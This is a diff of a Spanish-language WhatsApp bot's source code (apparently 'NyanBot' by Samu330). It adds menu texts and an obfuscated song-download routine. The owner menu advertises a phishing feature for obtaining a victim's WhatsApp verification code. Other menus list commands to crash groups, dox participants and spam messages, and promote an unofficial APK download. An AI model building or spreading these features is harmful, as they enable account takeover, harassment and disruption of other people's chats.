sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[4]}`)){let orlist= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[9]}${orlist[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg= await y2mateA(`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[18]}`)){let orlist1= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[6]}`);reply(`${_0x4dab[19]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[9]}${orlist1[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg1= await y2mateA(`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg1[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[20]}`)){let orlist11= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[9]}${orlist11[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg11= await y2mateA(`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg11[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[16]}`)){let orlist111= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`);reply(`${_0x4dab[21]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[22]}${orlist111[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[23]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg111= await y2mateA(`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg111[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}}
 
@@ -1983,7 +1313,7 @@ var _0x4dab=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x
             if (sam.message.listResponseMessage){
 				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
 				if (test.includes(`juegos`)){
-                    reply(`🎮 *Juegos skullgirl* 🍒
+                    reply(`🎮 *Juegos NyanBot* 🍒
 - ${prefix}ttt
 _TicTacToe_
 
@@ -1994,7 +1324,224 @@ _Juego de suerte_
 _Ps DADOS!!_`)
                 }
             }
-			
+			if (sam.message.listResponseMessage){
+				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
+				if (test.includes(`logos`)){
+					samu330.updatePresence(from, Presence.composing)
+					if (!isRegister) return reply(mess.only.usrReg)
+					uptime = process.uptime()
+					const Menu7 = {
+					text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
+					Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:
+					paypal.me/samu330
+					${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
+					${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
+					${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
+					${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
+					${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
+					${bodyM} ${prefix}ger *(Etiqueta una imagen)*
+					${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
+					${bodyM} ${prefix}cg *(Etiqueta una imagen)*
+					*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
+							 🌸 SamịPerry.li 🌸
+					 ******************************
+					`,
+					contextInfo: {
+					mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+					}
+					}
+					samu330.sendMessage(from, Menu7, MessageType.text, {
+					quoted: fvid})
+					addFilter(from)
+					addLevelingLevel(sender, 5)		
+			}
+			}
+			if (sam.message.listResponseMessage){
+				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
+				if (test.includes(`owner`)){
+					samu330.updatePresence(from, Presence.composing)
+					if (!isRegister) return reply(mess.only.usrReg)
+					const Menu8 = {
+					text: `*COMANDOS PARA ${botNumber}*
+*Pará actualizar el bot:*
+_${prefix}actualizar_
+*Para apagar el bot:*
+_${prefix}apagar_
+⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 
+*${prefix}Restaurar*
+Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
+funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.
+╭─────────────
+│ *${prefix}ban*
+│ _Prohibe el uso del bot a una persona_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}unban*
+│ _Permite el uso del bot a una persona baneada_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}banchat*
+│ _Bloquea el uso del bot en los chats que se active_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}bloquear*
+│ _Bloquea usuarios_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desbloquear*
+│ _Desbloquea usuarios_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}setname*
+│ _Cambia tu nombre de usuario_
+│
+│ *${prefix}setpic*
+│ _Actualiza tu foto de perfil_
+│
+│ *${prefix}setstatus*
+│ _Cambia tu estado de WhatsApp_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estado*
+│ _Envia un estado de texto_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estadopic*
+│ _Envia una imagen a tu estado_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}estadovid*
+│ _Envia un video a tu estado_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}vaciar*
+│ _Vacia el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}vaciartodo*
+│ _Elimina todos los chats_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}bc*
+│ _Broadcast_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}spam*
+│ _Spam de mensajes_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}fijar*
+│ _Fijar el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desfijar*
+│ _Desfija el chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}archivar*
+│ _Archiva un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desarchivar*
+│ _Desarchiva todo_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}silencio*
+│ _Mutea un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}desilenciar*
+│ _Desmutea un chat_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}sinleer*
+│ _Muestra Chats sin leer_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}apagar*
+│ _Apaga el bot_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}marcarsinleer*
+│ _Marca como no leido todos los chats_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}leertodo*
+│ _Lee todos los chats_
+╰──────────────────────`,
+					contextInfo: {
+					mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+					}
+					}
+					samu330.sendMessage(from, Menu8, MessageType.text, {
+					quoted: ftoko})
+					addFilter(from)
+					addLevelingLevel(sender, 5)	
+			}
+			}
+			if (sam.message.listResponseMessage){
+				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
+				if (test.includes(`crash`)){
+					if (!isRegister) return reply(mess.only.usrReg)
+					reply('*Gathering information...*')
+					smww = fs.readFileSync(`./media/SmWW.png`)
+					menu9 = `*${pushname}*
+_Estos comandos solo pueden ser utilizados en grupos, y solo los puede uzar ${botNumber}_
+					🔥 ${prefix}crash
+					🔥 ${prefix}crash2
+					🔥 ${prefix}crash3
+					🔥 ${prefix}crashloc
+					🔥 ${prefix}crashcom
+					🔥 ${prefix}crashpc
+💠Si quieres ser inmune a estos comandos, Samu a creado un WhatsApp que soporta estos bugs, si quieres probar este WhatsApp comunicate con el:
+*wa.me/+529984907794*
+O bien puedes descargar desde el enlace...
+https://www.mediafire.com/file/3srfb3tledxwg87/Inmune_Crash_Bot%25E2%259C%258F%25EF%25B8%258F.apk/file
+Si quieres tener este bot, y usar tu los comandos, ve como se instala aqui:
+_https://www.youtube.com/watch?v=rOPBe6O-k3M_`
+					
+					samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
+						fromMe: false, 
+						participant: `0@s.whatsapp.net`, ...(from ? {
+							remoteJid: "status@broadcast" } : {}) }, 
+								message: { 
+									"imageMessage": { 
+									"mimetype": 
+									"image/jpeg", 
+									"caption": "➫*👑Samu330 Crashing Groups!!🔥*\n😈Samu330 Domina🥀" ,
+									"jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
+			}
+			}
 			if (sam.message.listResponseMessage){
 				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
 				if (test.includes(`audios`)){
@@ -2169,14 +1716,14 @@ case 'menu':
 case 'comandos':
 reply(`*EL MENU CAMBIO, AHORA PARA PEDIR EL MENU USA EL STICKER QUE SE ENVIARA A CONTINUACION.*
 
-`)
+_☣NO RENOMBRES NI CAMBIES NADA DEL STICKER, YA QUE SI LO HACES PERDERA SU FORMATO Y EL BOT NO PODRA RECONOCER EL FileSha256 Y NO SE ENVIARA EL MENU!_`)
 samu330.sendMessage(from, fs.readFileSync(`./temp/menu.webp`), sticker, {quoted: fimg, "forwardingScore": 9999, "isForwarded": true})
 reply(`*Si tienes problemas con el nuevo menu, usa el anterior, el nuevo comando para el menu anterior es: ${prefix}menuofc*`)
 break
 
 case 'menuofc':
 
-redes = ['recuerda respetar las reglas', 'disfrutemos juntos de este maravilloso juego']
+redes = ['*sientete libre de preguntar lo que quieras* ', '*somos amig@s,herman@s, familia*']
 opcion = redes[Math.floor(Math.random() * redes.length)]
 
 var num = sam.participant
@@ -2292,10 +1839,66 @@ var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','31843
 samu330.sendMessage(from, fs.readFileSync('./src/ara.png'), image, {quoted: ftoko, caption: Menu, thumbnail: fs.readFileSync('./src/ara.png'), sendEphemeral: true})
 }
 break
-
 case 'menu2':
 if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
-samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
+stc = `╭⸻⃞✫꯭𝙈꯭𝙀꯭𝙉꯭𝙐꯭✫⃞⸻╮
+╰────ြ𝐒𝐭𝐢𝐜𝐤𝐞𝐫🃏
+╭─────────────
+│ *${prefix}sticker*
+│ _Imagen/gif/video_
+│ Para crear sticker con video,
+│ eiqueta el video/gif a
+│ convertir con el comando. 
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}spack*
+│ _Paquete personalizado_
+│Ex: *${prefix}spack* Samu|330
+╰───────────────────╮
+╭───────────────────╯
+│ *${prefix}robar*
+│ *${prefix}exif*
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}takestick*
+│ _Nombre|Autor_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}sgay*
+│ _Etiqueta una imagen_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}srip*
+│ _Etiqueta una imagen_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}scarcel*
+│ _Etiqueta una imagen_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}swm*
+│ _Nombre|Autor_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}colores*
+│ _Texto a colores_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}ger*
+│ _Estilo Triggered_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}aimg*
+│ _Stiker a imagen_
+╰─────────────╮
+╭─────────────╯
+│ *${prefix}agif*
+│ _Stiker a gif_
+╰─────────────╮
+╭─────────────┴╮
+│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li 
+╰──────────────╯`
+samu330.sendMessage(from, stc, MessageType.text, {quoted:
 { key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
@@ -2309,8 +1912,112 @@ break
 
 case 'menu1':
 if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
-trol = fs.readFileSync('./media/trol.mp4')
-samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
+
+mda = `
+╔════════════════╗
+╠  ◈  𝙈𝙀𝙉𝙐⁪⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼 ◈  ╣
+╠════════════════╝
+║
+╠ *●${prefix}clima* + region
+║ _El clima_
+║
+╠ *●${prefix}zalgo*
+║ _Texto estilo zalgo_
+║
+╠ *●${prefix}contar*
+║ _Cuenta caracteres de un texto_
+║
+╠ *●${prefix}caras*
+║ _Etiqueta una imagen para detectar caras_
+║
+║
+╠ *●${prefix}quemusicaes*
+║ _Busca el nombre de las canciones que no conozcas_
+║
+╠ *●${prefix}imagen*
+║ _Búsqueda de imágenes_
+║ _en Google_
+║
+╠ *●${prefix}sinfondo*
+║ _Quita fondo a imagenes_
+║
+╠ *●${prefix}wp* 
+║ _Búsqueda de fondos_
+║ _de pantalla_
+║
+╠ *●${prefix}par*
+║ _Anime para compartir perfil_
+║ _(hombre | mujeres)_
+║
+╠ *●${prefix}animevid*
+║ _Videos anime cortos_
+║
+╠ *●${prefix}queanime*
+║ _Etiqueta una imagen de un Anime_
+║ _Para saber que anime es_
+║
+╠ *●${prefix}loli*
+║
+╠ *●${prefix}neko*
+║
+╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
+║
+╠ *●${prefix}bass*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}ardilla*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}trigger*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}lento*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}rapido*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}imut*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}hode*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}grave*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}fantasma*
+║ _Etiqueta un audio_
+║
+╠ *●${prefix}robot*
+║ _Etiqueta un audio_
+║
+╟╼╾┤🎞VIDEOS🎞├╼╾
+║
+╠ *●${prefix}reversa*
+║ _Etiqueta un video_
+║
+╠ *●${prefix}vrapido*
+║ _Etiqueta un video_
+║
+╠ *●${prefix}vlento*
+║ _Etiqueta un video_
+║
+╠ *●${prefix}mirror*
+║ _Etiqueta un video_
+║
+╠ *●${prefix}vefecto*
+║ _Etiqueta un video_
+║
+╠ *●${prefix}sinsonido*
+║ _Etiqueta un video_
+╙╖
+╒╩════════════
+╰──────────────╮
+╭──────────────┴╮
+│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li🌴
+╰───────────────╯`
+samu330.sendMessage(from, mda, MessageType.text, {quoted:
 { key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
@@ -2321,32 +2028,158 @@ message: {
 addFilter(from)
 addLevelingLevel(sender, 5)		
 break
-
 case 'menu3':
 samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return reply(mess.only.usrReg)
 uptime = process.uptime()
+
+const Menug = {
+text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
+🔐Hola *${pushname}*
+
+${bodyM} ${samu}${prefix}antilink${samu}
+${bodyM} ${samu}${prefix}antimedia${samu}
+${bodyM} ${samu}${prefix}antibad${samu}
+${bodyM} ${samu}${prefix}autostick${samu}
+${bodyM} ${samu}${prefix}antileg${samu}
+
+${bodyM} ${samu}${prefix}antigp${samu}
+_Para prohibir los links de otros grupos_
+
+================================
+*🔞PARA ACTIVAR LOS COMANDOS +18*:
+================================
+${bodyM} ${prefix}+18 1/0
+================================
+    _Modo simsimi ilimitado_
+
+*${prefix}simsimi 1*
+
+
+*Para que el bot entre a tu grupo, usa el siguiente comando:*
+	${prefix}entrabot *(Link del grupo)*
+	
+🚧 *El siguiente comando es para crashear los grupos!! este comando es muy peligroso :) solo administradores pueden usarlo.* 🚧
+
+*${prefix}buggp*
+
+_Usalo bajo tu responsabilidad!_
+
+
+${bodyM} ${prefix}doxing _(Etiqueta un participante o algun mensaje)_
+${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
+${bodyM} ${prefix}nuevogrupo
+${bodyM} ${prefix}grupo abrir/cerrar
+${bodyM} ${prefix}getpic
+${bodyM} ${prefix}salir
+${bodyM} ${prefix}tagstick
+${bodyM} ${prefix}imagetag
+${bodyM} ${prefix}hidetag
+${bodyM} ${prefix}todos
+${bodyM} ${prefix}setdesc
+${bodyM} ${prefix}nombre
+${bodyM} ${prefix}adminlist
+${bodyM} ${prefix}setpic
+${bodyM} ${prefix}enlinea
+${bodyM} ${prefix}promote
+${bodyM} ${prefix}demote
+${bodyM} ${prefix}eliminar
+${bodyM} ${prefix}añadir *(Numero sin el +)*
+${bodyM} ${prefix}notif
+${bodyM} ${prefix}reply @miembro|frase|frase
+${bodyM} ${prefix}contacto @miembro|nombre
+${bodyM} ${prefix}link
+${bodyM} ${prefix}top5
+${bodyM} ${prefix}clonar
+`,
+contextInfo: {
+mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+}
+}
 addFilter(from)
 addLevelingLevel(sender, 5)		
 samu330.sendMessage(from, Menug, MessageType.text, {
 quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
 break
-
 case 'menu4':
 samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return reply(mess.only.usrReg)
 uptime = process.uptime()
-samu330.sendMessage(from, `${Menud}`, MessageType.text, {
+const Menud = {
+text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li   
+
+🔐Hola *${pushname}*
+
+♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪
+
+${bodyM} ${prefix}play *(Descarga de musica)*
+${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
+${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
+${bodyM} ${prefix}twit *(videos de Twitter)*
+${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
+${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
+${bodyM} ${prefix}fb _(Link de FaceBook)_
+${bodyM} ${prefix}mfire *(Link de mediafire)*
+${bodyM} ${prefix}tomp3 *(Videos a audio)*
+${bodyM} ${prefix}letra *(Busca la letra de una cancion)*
+`,
+contextInfo: {
+mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+}
+}
+samu330.sendMessage(from, Menud, MessageType.text, {
 quoted:  fvid})
 addFilter(from)
 addLevelingLevel(sender, 5)		
 break
-
 case 'menu5':
 samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return reply(mess.only.usrReg)
 uptime = process.uptime()
-samu330.sendMessage(from, `${Menuo}`, MessageType.text, {
+const Menuo = {
+text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                
+
+
+${bodyM} ${prefix}grupos *(Ve los grupos del bot)*
+${bodyM} ${prefix}timer *(Cronometro)*
+${bodyM} ${prefix}calc *(Calculadora)*
+${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
+${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
+${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
+${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
+${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
+		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
+${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
+${bodyM} ${prefix}tiktokstalk @usuario
+${bodyM} ${prefix}hidetag *(Texto)*
+${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
+${bodyM} ${prefix}shortlink _(Acortador de links)_
+${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
+${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
+${bodyM} ${prefix}binatext *(codigo binario a texto)*
+${bodyM} ${prefix}aoctal *(texto a codigo octal)*
+${bodyM} ${prefix}octalatext *(codigo octal a texto)*
+${bodyM} ${prefix}ahex *(texto a codigo hex)*
+${bodyM} ${prefix}hexatext *(codigo hex a texto)*
+${bodyM} ${prefix}wa.me
+${bodyM} ${prefix}idioimas
+${bodyM} ${prefix}reversa
+${bodyM} ${prefix}meme
+${bodyM} ${prefix}leermas _frase/frase_
+${bodyM} ${prefix}mapa
+${bodyM} ${prefix}soyyo
+${bodyM} ${prefix}blocklist
+${bodyM} ${prefix}leerimagen
+
+*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
+	      🌸 SamịPerry.li 🌸
+ ********************************
+`,
+contextInfo: {
+mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
+}
+}
